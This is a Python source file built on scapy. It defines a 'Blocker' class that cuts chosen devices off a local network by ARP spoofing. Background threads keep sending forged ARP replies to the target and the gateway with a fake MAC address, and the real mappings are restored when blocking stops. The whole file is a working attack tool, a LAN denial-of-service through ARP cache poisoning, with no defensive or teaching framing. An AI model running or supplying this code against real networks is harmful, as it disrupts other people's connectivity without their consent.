import threading
import time

from scapy.all import ARP, Ether, srp, send, getmacbyip, conf, get_if_addr

_SPOOF_INTERVAL = 0.5
_BURST = 5


def _get_gateway_ip():
    try:
        gw = conf.route.route("0.0.0.0")[2]
        if gw and gw != "0.0.0.0":
            return gw
    except Exception:
        pass
    local = get_if_addr(conf.iface)
    return ".".join(local.split(".")[:3]) + ".1"


class Blocker:
    def __init__(self):
        self._threads = {}
        self._stop = {}
        self.gateway_ip = _get_gateway_ip()
        self.gateway_mac = getmacbyip(self.gateway_ip)

    def refresh_gateway(self):
        self.gateway_ip = _get_gateway_ip()
        if not self.gateway_mac:
            try:
                self.gateway_mac = getmacbyip(self.gateway_ip)
            except Exception:
                self.gateway_mac = None
        return self.gateway_mac

    def is_blocking(self, mac):
        return mac in self._threads and self._threads[mac].is_alive()

    def active(self):
        return [m for m in self._threads if self.is_blocking(m)]

    def _resolve(self, target_ip):
        return getmacbyip(target_ip)

    def _spoof_loop(self, target_ip, target_mac, stop_event):
        fake_mac = "de:ad:be:ef:00:01"
        while not stop_event.is_set():
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                     psrc=self.gateway_ip, hwsrc=fake_mac),
                 count=_BURST, verbose=False)
            if self.gateway_mac:
                send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                         psrc=target_ip, hwsrc=fake_mac),
                     count=_BURST, verbose=False)
            stop_event.wait(_SPOOF_INTERVAL)
        self._restore(target_ip, target_mac)

    def _restore(self, target_ip, target_mac):
        if not self.gateway_mac:
            return
        for _ in range(5):
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac,
                     psrc=self.gateway_ip, hwsrc=self.gateway_mac),
                 verbose=False)
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                     psrc=target_ip, hwsrc=target_mac),
                 verbose=False)
            time.sleep(0.3)

    def block(self, target_ip, mac):
        if self.is_blocking(mac):
            return
        target_mac = self._resolve(target_ip)
        if not target_mac:
            raise RuntimeError(f"Não consegui resolver o MAC de {target_ip}")
        stop_event = threading.Event()
        t = threading.Thread(
            target=self._spoof_loop,
            args=(target_ip, target_mac, stop_event),
            daemon=True,
        )
        self._stop[mac] = stop_event
        self._threads[mac] = t
        t.start()

    def unblock(self, mac):
        if mac in self._stop:
            self._stop[mac].set()
        t = self._threads.get(mac)
        if t:
            t.join(timeout=3)
        self._threads.pop(mac, None)
        self._stop.pop(mac, None)

    def unblock_all(self):
        for mac in list(self._threads):
            self.unblock(mac)
